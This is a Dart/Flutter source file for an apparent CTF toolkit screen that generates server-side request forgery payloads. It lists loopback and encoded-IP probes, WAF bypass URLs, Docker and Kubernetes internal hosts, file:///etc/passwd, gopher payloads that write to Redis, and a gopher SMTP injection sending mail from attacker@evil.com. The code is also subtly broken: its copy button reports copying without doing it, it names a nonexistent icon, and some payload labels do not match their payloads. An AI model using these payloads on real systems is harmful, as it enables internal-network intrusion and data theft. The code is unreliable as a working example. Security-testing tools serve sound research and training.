import 'package:flutter/material.dart';
import 'package:ctf_tools/shared/widgets/code_editor.dart';
import 'dart:convert';

class SSRFDetectorScreen extends StatefulWidget {
  const SSRFDetectorScreen({super.key});

  @override
  State<SSRFDetectorScreen> createState() => _SSRFDetectorScreenState();
}

class _SSRFDetectorScreenState extends State<SSRFDetectorScreen> {
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _payloadController = TextEditingController();
  String _payloadType = 'basic';

  final List<Map<String, String>> _basicPayloads = [
    {'name': '本地回环', 'payload': 'http://127.0.0.1'},
    {'name': '本地回环 IPv6', 'payload': 'http://[::1]'},
    {'name': 'localhost', 'payload': 'http://localhost'},
    {'name': '内部 DNS', 'payload': 'http://localhost.localdomain'},
    {'name': '八进制 IP', 'payload': 'http://0177.0.0.1'},
    {'name': '十六进制 IP', 'payload': 'http://0x7f.0x0.0x0.0x1'},
    {'name': '十进制 IP', 'payload': 'http://2130706433'},
    {'name': 'DNS 重绑定', 'payload': 'http://127.127.127.127'},
  ];

  final List<Map<String, String>> _bypassPayloads = [
    {'name': '目录遍历', 'payload': 'http://127.0.0.1@localhost'},
    {'name': 'URL 编码', 'payload': 'http://127.0.0.1%00@example.com'},
    {'name': '协议混淆', 'payload': 'http://127.1@localhost'},
    {'name': 'IPv6 映射', 'payload': 'http://[0:0:0:0:0:ffff:127.0.0.1]'},
    {'name': 'DNS 记录', 'payload': 'http://localtest.me'},
    {'name': '重定向服务', 'payload': 'http://redirect.localhost.to/127.0.0.1'},
    {'name': 'Docker 网关', 'payload': 'http://172.17.0.1'},
    {'name': 'Kubernetes', 'payload': 'http://kubernetes.default.svc'},
  ];

  final List<Map<String, String>> _advancedPayloads = [
    {'name': 'Gopher 协议', 'payload': 'gopher://127.0.0.1:6379/_GET%20HTTP/1.1%250d%250aHost:%2520127.0.0.1%250d%250a%250d%250a'},
    {'name': 'Dict 协议', 'payload': 'dict://127.0.0.1:11211/stats'},
    {'name': 'File 协议', 'payload': 'file:///etc/passwd'},
    {'name': 'TFTP 协议', 'payload': 'tftp://127.0.0.1:69/test'},
    {'name': 'LDAP 协议', 'payload': 'ldap://127.0.0.1:389'},
    {'name': 'Redis GET', 'payload': 'gopher://127.0.0.1:6379/_GET%20key%0d%0a'},
    {'name': 'Redis SET', 'payload': 'gopher://127.0.0.1:6379/_SET%20key%20value%0d%0a'},
    {'name': 'SMTP 发送', 'payload': 'gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@victim.com>%0d%0aDATA%0d%0aSubject:%20SSRF%20Attack%0d%0a%0d%0aEvil%20Content%0d%0a.%0d%0aQUIT%0d%0a'},
  ];

  List<Map<String, String>> _getCurrentPayloads() {
    switch (_payloadType) {
      case 'basic':
        return _basicPayloads;
      case 'bypass':
        return _bypassPayloads;
      case 'advanced':
        return _advancedPayloads;
      default:
        return _basicPayloads;
    }
  }

  void _generatePayloads() {
    final target = _targetController.text.trim();
    final payloads = _getCurrentPayloads();
    
    final buffer = StringBuffer();
    buffer.writeln('=== SSRF Payload 列表 ===\n');
    buffer.writeln('目标：$target\n');
    buffer.writeln('类型：${_payloadType.toUpperCase()}\n');
    buffer.writeln('=' * 50);
    
    for (var p in payloads) {
      buffer.writeln('\n【${p['name']}】');
      buffer.writeln('${p['payload']}$target');
      buffer.writeln('-' * 50);
    }
    
    setState(() {
      _payloadController.text = buffer.toString();
    });
  }

  void _clear() {
    setState(() {
      _targetController.clear();
      _payloadController.clear();
    });
  }

  void _copyPayload() {
    if (_payloadController.text.isNotEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'SSRF 检测工具',
                    style: Theme.of(context).textTheme.titleLarge,
                  ),
                  const SizedBox(height: 8),
                  const Text(
                    '生成 SSRF 攻击 Payload，支持基础探测、WAF 绕过和高级协议利用。',
                    style: TextStyle(color: Colors.grey),
                  ),
                  const SizedBox(height: 16),
                  DropdownButtonFormField<String>(
                    value: _payloadType,
                    decoration: const InputDecoration(
                      labelText: 'Payload 类型',
                      border: OutlineInputBorder(),
                    ),
                    items: const [
                      DropdownMenuItem(value: 'basic', child: Text('基础探测 - 本地回环、DNS 等')),
                      DropdownMenuItem(value: 'bypass', child: Text('WAF 绕过 - 编码、混淆等')),
                      DropdownMenuItem(value: 'advanced', child: Text('高级利用 - Gopher、Dict 等协议')),
                    ],
                    onChanged: (value) {
                      setState(() {
                        _payloadType = value!;
                      });
                    },
                  ),
                  const SizedBox(height: 16),
                  TextField(
                    controller: _targetController,
                    decoration: const InputDecoration(
                      labelText: '目标路径/参数',
                      border: OutlineInputBorder(),
                      helperText: '例如：/api/fetch?url= 或 192.168.1.1:8080',
                    ),
                  ),
                  const SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.end,
                    children: [
                      ElevatedButton.icon(
                        onPressed: _clear,
                        icon: const Icon(Icons.clear),
                        label: const Text('清空'),
                      ),
                      const SizedBox(width: 8),
                      ElevatedButton.icon(
                        onPressed: _copyPayload,
                        icon: const Icon(Icons.content_copy),
                        label: const Text('复制'),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 16),
          Center(
            child: ElevatedButton.icon(
              onPressed: _generatePayloads,
              icon: const Icon(Icons.generate),
              label: const Text('生成 Payload'),
              style: ElevatedButton.styleFrom(
                padding: const EdgeInsets.symmetric(horizontal: 48, vertical: 16),
              ),
            ),
          ),
          const SizedBox(height: 16),
          CodeEditor(
            controller: _payloadController,
            label: '生成的 Payload 列表',
            height: 400,
            readOnly: true,
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _targetController.dispose();
    _payloadController.dispose();
    super.dispose();
  }
}
